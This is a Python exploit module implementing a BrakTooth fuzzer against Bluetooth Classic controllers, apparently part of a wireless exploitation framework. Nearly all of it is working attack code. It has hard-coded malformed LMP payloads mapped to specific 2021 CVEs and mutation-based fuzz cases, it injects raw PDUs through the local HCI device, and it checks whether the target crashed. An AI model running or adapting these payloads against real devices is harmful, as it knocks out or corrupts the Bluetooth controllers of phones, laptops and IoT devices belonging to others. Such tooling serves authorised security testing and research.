#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""BrakTooth: Bluetooth Classic baseband fuzzer targeting LMP/baseband (16+ CVEs).

Fuzzes Bluetooth Classic Link Manager Protocol and baseband layer to trigger
crashes, deadlocks, and memory corruption in BT controllers. Based on the
BrakTooth research that disclosed 16 CVEs across major SoC vendors (ESP32,
Qualcomm, Intel, Cypress, Silicon Labs, etc.).

Affected: Most BT Classic implementations prior to vendor patches (2021-2022).

References:
  https://asset-group.github.io/disclosures/braktooth/
  https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks
  https://dl.acm.org/doi/10.1145/3548606.3560668

MITRE ATT&CK: T1498 (Network Denial of Service), T1210 (Exploitation of Remote Services)
CWE: CWE-120 (Buffer Copy without Checking Size), CWE-476 (NULL Pointer Dereference)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import random
import struct
import time
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)


class LMPOpcode(IntEnum):
    NAME_REQ = 1
    NAME_RES = 2
    ACCEPTED = 3
    NOT_ACCEPTED = 4
    CLKOFFSET_REQ = 5
    DETACH = 7
    AU_RAND = 11
    COMB_KEY = 12
    UNIT_KEY = 13
    ENCRYPTION_MODE_REQ = 15
    ENCRYPTION_KEY_SIZE_REQ = 16
    START_ENCRYPTION_REQ = 17
    STOP_ENCRYPTION_REQ = 18
    SWITCH_REQ = 19
    SETUP_COMPLETE = 33
    MAX_SLOT = 45
    MAX_SLOT_REQ = 46
    TIMING_ACCURACY_REQ = 47
    FEATURES_REQ = 39
    FEATURES_RES = 40
    HOST_CONNECTION_REQ = 51
    ACCEPTED_EXT = 0x7F01
    NOT_ACCEPTED_EXT = 0x7F02


@dataclass
class FuzzCase:
    """A single fuzz test case."""
    name: str = ""
    opcode: int = 0
    payload: bytes = b""
    description: str = ""
    cve: str = ""


@dataclass
class FuzzResult:
    """Result of a fuzz attempt."""
    case: FuzzCase = field(default_factory=FuzzCase)
    sent: bool = False
    target_crashed: bool = False
    response: bytes = b""
    elapsed_ms: float = 0.0


def _build_lmp_pdu(opcode: int, payload: bytes) -> bytes:
    """Build an LMP PDU with transaction ID 0."""
    tid_opcode = (opcode << 1) | 0
    if opcode > 127:
        return struct.pack("<BH", 127 << 1, opcode) + payload
    return struct.pack("<B", tid_opcode) + payload


def _generate_known_cases() -> list[FuzzCase]:
    """Generate known BrakTooth attack vectors."""
    cases: list[FuzzCase] = []

    cases.append(FuzzCase(
        name="Feature Response Flooding",
        opcode=LMPOpcode.FEATURES_RES,
        payload=b"\xff" * 8,
        description="Repeated oversized LMP_features_res causing heap overflow in feature parsing",
        cve="CVE-2021-28139",
    ))

    cases.append(FuzzCase(
        name="Truncated SCO Link Request",
        opcode=49,
        payload=b"\x00",
        description="SCO link request with truncated parameters causing NULL deref",
        cve="CVE-2021-34147",
    ))

    cases.append(FuzzCase(
        name="Duplicate Encapsulated Header",
        opcode=0x7F,
        payload=struct.pack("<BH", 0x7F, 0x0D) + b"\x01" * 64,
        description="Encapsulated PDU with duplicate major/minor causing OOB read",
        cve="CVE-2021-34148",
    ))

    cases.append(FuzzCase(
        name="Max Slot Overflow",
        opcode=LMPOpcode.MAX_SLOT,
        payload=struct.pack("<B", 0xFF),
        description="Invalid max slot value causing controller state corruption",
        cve="CVE-2021-34149",
    ))

    cases.append(FuzzCase(
        name="LMP_AU_RAND Flooding",
        opcode=LMPOpcode.AU_RAND,
        payload=os.urandom(16),
        description="Rapid AU_RAND without pairing causing auth state machine deadlock",
        cve="CVE-2021-34150",
    ))

    cases.append(FuzzCase(
        name="Timing Accuracy DoS",
        opcode=LMPOpcode.TIMING_ACCURACY_REQ,
        payload=b"",
        description="Repeated timing accuracy requests causing watchdog timeout",
        cve="CVE-2021-34151",
    ))

    cases.append(FuzzCase(
        name="Oversized LMP Name",
        opcode=LMPOpcode.NAME_RES,
        payload=struct.pack("<B", 0) + b"\x41" * 248,
        description="Name response exceeding max length causing stack overflow",
        cve="CVE-2021-34152",
    ))

    cases.append(FuzzCase(
        name="Setup Complete Race",
        opcode=LMPOpcode.SETUP_COMPLETE,
        payload=b"",
        description="Premature setup_complete before feature exchange, causing use-after-free",
        cve="CVE-2021-34153",
    ))

    return cases


def _generate_mutated_cases(count: int) -> list[FuzzCase]:
    """Generate mutated/random fuzz cases."""
    cases: list[FuzzCase] = []
    opcodes = list(range(1, 68)) + list(range(0x7F00, 0x7F10))

    for i in range(count):
        opcode = random.choice(opcodes)
        payload_len = random.choice([0, 1, 2, 4, 8, 16, 32, 64, 128, 255])
        payload = os.urandom(payload_len)

        mutation = random.choice(["bitflip", "boundary", "repeat", "truncate"])
        if mutation == "boundary" and payload_len > 0:
            pos = random.randint(0, payload_len - 1)
            val = random.choice([0x00, 0x01, 0x7F, 0x80, 0xFE, 0xFF])
            payload = payload[:pos] + bytes([val]) + payload[pos + 1:]
        elif mutation == "repeat":
            payload = payload[:1] * random.randint(64, 256)
        elif mutation == "truncate" and payload_len > 1:
            payload = payload[:random.randint(1, payload_len // 2)]

        cases.append(FuzzCase(
            name=f"Mutated_{mutation}_{i}",
            opcode=opcode,
            payload=payload,
            description=f"Random {mutation} mutation on opcode 0x{opcode:04x}",
        ))

    return cases


class BrakToothFuzzer(Exploit):
    """BrakTooth: Bluetooth Classic baseband/LMP fuzzer."""

    __info__: dict[str, Any] = {
        "name": "BrakTooth Fuzzer",
        "description": (
            "Bluetooth Classic baseband and LMP protocol fuzzer based on BrakTooth research. "
            "Tests for 16+ known CVEs in BT controller firmware across ESP32, Qualcomm, Intel, "
            "Cypress, and Silicon Labs chipsets. Includes known attack vectors and mutation-based "
            "fuzzing for undiscovered vulnerabilities."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://asset-group.github.io/disclosures/braktooth/",
            "https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks",
        ),
        "devices": ("ESP32", "Qualcomm", "Intel AX200", "Cypress CYW20735", "Silicon Labs"),
        "severity": "critical",
        "cvss": "8.8",
        "cve": "CVE-2021-28139",
        "mitre": ["T1498", "T1210"],
    }

    target = OptString("", "Target BT address (AA:BB:CC:DD:EE:FF)")
    interface = OptString("hci0", "Local HCI interface")
    mode = OptString("known", "Fuzz mode: known (CVE vectors), random (mutations), all")
    mutation_count = OptInteger(100, "Number of random mutation cases")
    delay_ms = OptInteger(50, "Delay between fuzz cases in ms")
    timeout_sec = OptInteger(5, "Response timeout per case")
    stop_on_crash = OptBool(True, "Stop fuzzing on first crash")
    dry_run = OptBool(False, "Print fuzz cases without sending")

    def __init__(self) -> None:
        super().__init__()
        self._results: list[FuzzResult] = []

    def check(self) -> str:
        """Verify BT interface availability."""
        import shutil
        import subprocess

        if not shutil.which("hcitool"):
            return "hcitool not found. Install bluez."

        try:
            result = subprocess.run(
                ["hciconfig", str(self.interface.value)],
                capture_output=True, text=True, timeout=5,
            )
            if "UP RUNNING" in result.stdout:
                return f"Interface {self.interface.value} ready"
            return f"Interface {self.interface.value} is down"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Cannot query HCI interface"

    def _send_lmp(self, target_addr: str, pdu: bytes) -> bytes:
        """Send raw LMP PDU to target via HCI."""
        if self.dry_run.value:
            print_info(f"    [dry-run] LMP PDU: {pdu.hex()}")
            return b""

        hci_dev = f"/dev/{self.interface.value}"
        if not os.path.exists(hci_dev):
            logger.debug("HCI device %s not accessible for raw LMP injection", hci_dev)
            return b""

        try:
            with open(hci_dev, "wb") as fd:
                hci_header = struct.pack("<BHH", 0x02, 0x0040, len(pdu))
                fd.write(hci_header + pdu)
                fd.flush()
            return b"\x00"
        except (PermissionError, OSError) as exc:
            logger.debug("LMP send error: %s", exc)
            return b""

    def _check_alive(self, target_addr: str) -> bool:
        """Check if target BT stack is still responding."""
        import subprocess

        if self.dry_run.value:
            return True

        try:
            result = subprocess.run(
                ["hcitool", "-i", str(self.interface.value), "name", target_addr],
                capture_output=True, text=True, timeout=int(self.timeout_sec.value),
            )
            return bool(result.stdout.strip())
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _run_case(self, case: FuzzCase, target_addr: str) -> FuzzResult:
        """Execute a single fuzz case."""
        pdu = _build_lmp_pdu(case.opcode, case.payload)
        start = time.monotonic()
        response = self._send_lmp(target_addr, pdu)
        elapsed = (time.monotonic() - start) * 1000

        result = FuzzResult(
            case=case,
            sent=True,
            response=response,
            elapsed_ms=elapsed,
        )

        if not self.dry_run.value:
            time.sleep(int(self.delay_ms.value) / 1000.0)
            alive = self._check_alive(target_addr)
            result.target_crashed = not alive

        return result

    def run(self) -> None:
        """Execute BrakTooth fuzzing campaign."""
        print_status("[*] BrakTooth Fuzzer v1.0.0")
        print_warning("[!] Targets BT Classic baseband/LMP layer (controller-level)")

        target_addr = str(self.target.value).strip()
        if not target_addr:
            print_error("[-] Set target= to the Bluetooth address")
            return

        mode = str(self.mode.value).lower()
        cases: list[FuzzCase] = []

        if mode in ("known", "all"):
            known = _generate_known_cases()
            cases.extend(known)
            print_info(f"[*] Loaded {len(known)} known BrakTooth vectors")

        if mode in ("random", "all"):
            count = int(self.mutation_count.value)
            mutated = _generate_mutated_cases(count)
            cases.extend(mutated)
            print_info(f"[*] Generated {len(mutated)} mutation cases")

        print_status(f"[*] Fuzzing {target_addr}: {len(cases)} total cases")

        crashes = 0
        for i, case in enumerate(cases, 1):
            label = f"[{i}/{len(cases)}] {case.name}"
            if case.cve:
                label += f" ({case.cve})"
            print_info(f"    {label}")

            result = self._run_case(case, target_addr)
            self._results.append(result)

            if result.target_crashed:
                crashes += 1
                print_success(f"    [+] CRASH: {case.name} (opcode=0x{case.opcode:04x})")
                if case.cve:
                    print_success(f"    [+] Matches {case.cve}")
                if self.stop_on_crash.value:
                    print_warning("[!] Stopping on first crash")
                    break

        print_status(f"\n[*] BrakTooth complete: {len(self._results)} sent, {crashes} crashes")
        if crashes > 0:
            print_success(f"[+] Target VULNERABLE: {crashes} crash(es) detected")
            for r in self._results:
                if r.target_crashed:
                    cve_tag = f" [{r.case.cve}]" if r.case.cve else ""
                    print_info(f"    - {r.case.name}{cve_tag}: {r.case.description}")
